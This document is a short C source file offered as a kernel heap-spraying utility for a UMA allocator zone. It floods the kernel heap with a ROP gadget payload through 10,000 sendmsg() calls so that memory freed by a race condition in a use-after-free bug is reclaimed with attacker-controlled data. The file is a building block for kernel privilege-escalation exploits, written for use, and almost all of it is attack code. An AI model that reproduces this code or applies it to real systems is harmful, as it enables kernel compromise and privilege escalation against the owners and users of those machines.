/*
 * KERNEL HEAP SPRAYING UTILITY
 * 
 * Target: Universal Memory Allocator (UMA) - M_TEMP Zone
 * This utility uses the sendmsg() primitive to flood the kernel heap 
 * and reclaim dangling pointers in UAF scenarios.
 */

#include <sys/socket.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>

void perform_kernel_spray(int sock_fd, uint64_t* rop_payload, size_t payload_len) {
    struct msghdr msg;
    struct iovec iov;
    
    memset(&msg, 0, sizeof(msg));
    
    // Payload contains controlled ROP gadgets
    iov.iov_base = rop_payload;
    iov.iov_len = payload_len;
    
    msg.msg_iov = &iov;
    msg.msg_iovlen = 1;

    /*
     * We perform 10,000 allocations to increase the probability 
     * of reclaiming the slot freed by the race condition.
     */
    for (int i = 0; i < 10000; i++) {
        sendmsg(sock_fd, &msg, 0);
    }
}
